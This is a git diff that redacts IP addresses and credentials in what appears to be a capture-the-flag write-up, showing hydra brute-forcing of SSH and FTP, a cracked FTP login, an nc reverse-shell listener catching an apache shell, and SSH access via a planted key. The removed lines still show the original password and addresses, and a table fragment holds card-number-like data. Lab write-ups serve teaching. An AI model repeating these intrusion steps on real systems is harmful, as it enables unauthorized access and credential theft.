@@ -114,31 +114,31 @@ gpg:  secret keys unchanged: 1
 | Muir Land      |m------------e|A---------------e | 5103 2219 1119 9245 |737|
 
 ```
-hydra -L user -P pass ssh://10.10.211.114
+hydra -L user -P pass ssh://--.--.---.---
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-09 18:26:54
 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
 [DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:3/p:3), ~1 try per task
-[DATA] attacking ssh://10.10.211.114:22/
-[ERROR] target ssh://10.10.211.114:22/ does not support password authentication (method reply 36).
+[DATA] attacking ssh://--.--.---.---:22/
+[ERROR] target ssh://--.--.---.---:22/ does not support password authentication (method reply 36).
 ```
 ```
-hydra -L user -P pass ftp://10.10.211.114
+hydra -L user -P pass ftp://--.--.---.---
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-09 18:26:00
 [DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:3/p:3), ~1 try per task
-[DATA] attacking ftp://10.10.211.114:21/
-[21][ftp] host: 10.10.211.114   login: paradox   password: ShibesAreGreat123
+[DATA] attacking ftp://--.--.---.---:21/
+[21][ftp] host: --.--.---.---   login: p-----x   password: S---------------3
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-09 18:26:04
 ```
 ```
-ftp 10.10.62.143                   
-Connected to 10.10.62.143.
+ftp --.--.---.---                   
+Connected to --.--.---.---
 220 (vsFTPd 3.0.3)
-Name (10.10.62.143:reggie): paradox
+Name (--.--.---.---:------): paradox
 331 Please specify the password.
 Password:
 230 Login successful.
@@ -172,8 +172,8 @@ drwxr-xr-x    2 48       48             24 Nov 08 21:25 backups
 ```
 nc -lvnp 9001                                                                                                                                                                              1 ⨯
 listening on [any] 9001 ...
-connect to [10.9.239.22] from (UNKNOWN) [10.10.62.143] 55848
-Linux ip-10-10-62-143 4.18.0-193.el8.x86_64 #1 SMP Fri May 8 10:59:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+connect to [--.--.---.---] from (UNKNOWN) [--.--.---.---] 55848
+Linux ip-..-..-...-... 4.18.0-193.el8.x86_64 #1 SMP Fri May 8 10:59:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
  01:42:51 up 18 min,  0 users,  load average: 0.00, 0.01, 0.04
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=48(apache) gid=48(apache) groups=48(apache)
@@ -228,11 +228,11 @@ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQ34iovToFijivw0W/q+yGp+l4WRJdlA4QG7
 ```                          
 
 ```
-ssh -i paradox paradox@10.10.62.143    
-The authenticity of host '10.10.62.143 (10.10.62.143)' can't be established.
+ssh -i paradox paradox@--.--.---.---    
+The authenticity of host '--.--.---.--- (--.--.---.---)' can't be established.
 ECDSA key fingerprint is SHA256:Zc/Zqa7e8cZI2SP2BSwt5iLz5wD3XTxIz2SLZMjoJmE.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '10.10.62.143' (ECDSA) to the list of known hosts.
+Warning: Permanently added '--.--.---.---' (ECDSA) to the list of known hosts.
 Last login: Sat Apr 10 01:59:56 2021
 ```
 
